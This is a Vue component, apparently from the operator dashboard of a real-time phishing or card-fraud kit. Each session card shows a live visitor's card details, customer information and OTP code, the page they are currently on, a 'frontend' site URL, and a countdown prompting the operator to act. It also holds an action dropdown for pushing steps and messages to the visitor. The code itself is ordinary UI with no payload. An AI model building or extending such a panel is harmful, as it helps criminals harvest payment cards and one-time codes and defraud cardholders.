<script setup lang="ts">
import { computed, ref } from 'vue';
import SessionFields from './session-fields.vue';
import SessionTabs from './session-tabs.vue';
import DetailPopup from './detail-popup.vue';
import ActionDropdown from './action-dropdown.vue';

const props = defineProps<{
  session: Api.Payment.PaymentSession;
}>();

const emit = defineEmits<{
  (e: 'action', action: Api.Payment.OperatorAction, sessionId: string, message?: string): void;
  (e: 'moveTop', sessionId: string): void;
}>();

function handleMoveTop() {
  emit('moveTop', props.session.id);
}

const showDetail = ref(false);
const hoveredTab = ref('');
let hideTimer: ReturnType<typeof setTimeout> | null = null;

function onHoverTab(label: string) {
  hoveredTab.value = label;
  showDetail.value = true;
  if (hideTimer) clearTimeout(hideTimer);
}
function onLeaveTabs() {
  hideTimer = setTimeout(() => { showDetail.value = false; }, 300);
}
function onEnterPopup() {
  if (hideTimer) clearTimeout(hideTimer);
}
function onLeavePopup() {
  showDetail.value = false;
}

const countdownText = computed(() => {
  if (props.session.status !== 'pending') return '';
  const s = props.session.countdownSeconds;
  if (s <= 0) return '⌛ 超时未操作';
  const m = Math.floor(s / 60);
  const sec = s % 60;
  return m + ':' + String(sec).padStart(2, '0');
});

const countdownClass = computed(() => {
  if (props.session.countdownSeconds <= 0) return 'expired';
  if (props.session.countdownSeconds <= 10) return 'urgent';
  if (props.session.countdownSeconds <= 30) return 'warning';
  return '';
});
</script>

<template>
  <div class="session-card" :class="{ offline: !session.isOnline }">
      <div class="left-bar" @click="handleMoveTop" title="移至顶部">
      <span class="arrow" :class="session.isOnline ? 'online' : ''">↑</span>
    </div>

    <div class="card-body">
      <div class="header">
        <span class="order-id">
          编号：{{ session.sessionId }} ({{ session.customerInfo.country || '-' }}-{{ session.id.slice(0,4) }})
        </span>
        <span class="status-dot" :class="session.isOnline ? 'online' : 'offline'">
          {{ session.isOnline ? '台 在线' : '离线' }}
        </span>
        <span v-if="session.status === 'pending'" class="countdown" :class="countdownClass">{{ countdownText }}</span>
        <span class="front-url">前台：{{ session.frontendUrl }}</span>
      </div>

      <SessionFields :card-info="session.cardInfo" :customer-info="session.customerInfo" />

      <div class="tabs-row" @mouseleave="onLeaveTabs">
        <SessionTabs :tabs="session.browsingTabs" :current-step="session.currentStep" @hover-tab="onHoverTab" />
        <DetailPopup
          v-show="showDetail && hoveredTab"
          :tab-label="hoveredTab"
          :customer-info="session.customerInfo"
          :card-info="session.cardInfo"
          :card-history="(session as any).cardHistory"
          @mouseenter="onEnterPopup"
          @mouseleave="onLeavePopup"
        />
      </div>

      <ActionDropdown
        :session-status="session.status"
        :has-otp="!!session.cardInfo.otpCode"
        :app-verify-pending="!!(session as any).appVerifyPending"
        :current-step="session.currentStep || ''"
        @action="(a, m) => emit('action', a, session.id, m)"
      />
    </div>
  </div>
</template>

<style scoped>
.session-card {
  position: relative;
  background: var(--n-color);
  border: 1px solid var(--n-border-color);
  border-radius: 6px;
  min-height: 104px;
  display: flex;
  align-items: flex-start;
  padding: 8px 8px 0 6px;
  overflow: visible;
  z-index: 1;
  transition: opacity .3s, box-shadow .2s;
}
.session-card + .session-card {
  margin-top: 8px;
}
html.dark .session-card {
  background: rgb(43, 48, 69);
}
html:not(.dark) .session-card {
  background: rgb(221 220 220 / 25%);
}
.session-card:hover {
  z-index: 20;
  box-shadow: 0 2px 8px rgba(0,0,0,.12);
}
.session-card + .session-card {
  margin-top: 8px;
}
.session-card.offline {
  opacity: .6;
}
.left-bar {
  width: 18px;
  height: 18px;
  border: 1px solid var(--n-border-color);
  border-radius: 3px;
  display: flex;
  align-items: center;
  justify-content: center;
  flex-shrink: 0;
  margin-right: 4px;
  font-size: 14px;
  color: var(--n-text-color-3);
  cursor: pointer;
  user-select: none;
}
.left-bar:hover {
  color: var(--n-text-color);
  border-color: var(--n-text-color-3);
}
.arrow.online {
  color: #18d46b;
}
.card-body {
  flex: 1;
  min-width: 0;
  position: relative;
}
.header {
  height: 20px;
  display: flex;
  align-items: center;
  gap: 10px;
  margin-bottom: 8px;
}
.order-id {
  display: inline-flex;
  align-items: center;
  padding: 0 10px;
  color: #119849;
  background: #d6fbe2;
  border: 1px solid #8cdfaa;
  border-radius: 3px;
  font-weight: bold;
  font-size: 12px;
  white-space: nowrap;
}
.status-dot {
  display: inline-flex;
  align-items: center;
  padding: 0 8px;
  border-radius: 3px;
  font-size: 12px;
  border: 1px solid;
}
.status-dot.online {
  color: #18d46b;
  background: #18d46b10;
  border-color: #18d46b33;
}
.status-dot.offline {
  color: var(--n-text-color-3);
  opacity: .6;
}
.countdown {
  display: inline-flex;
  align-items: center;
  padding: 0 8px;
  border-radius: 3px;
  font-weight: bold;
  font-size: 12px;
  color: var(--n-text-color);
  background: rgba(128,128,128,.1);
  border: 1px solid var(--n-border-color);
}
html.dark .countdown { background: rgba(255,255,255,.06); }
.countdown.warning {
  color: #f0a12d;
}
.countdown.urgent {
  color: #ff5d70;
  animation: blink 1s infinite;
}
.countdown.expired {
  color: #fff;
  background: #ff5d70;
  border-color: #ff5d70;
  animation: pulse-bg 2s infinite;
}
@keyframes blink {
  50% { opacity: .4; }
}
@keyframes pulse-bg {
  0%, 100% { background: #ff5d70; }
  50% { background: #c0392b; }
}
.front-url {
  color: var(--n-text-color-3);
  font-size: 12px;
  background: rgba(128,128,128,.08);
  border: 1px solid var(--n-border-color);
  padding: 0 10px;
  border-radius: 3px;
}
html.dark .front-url { background: rgba(255,255,255,.04); }
</style>
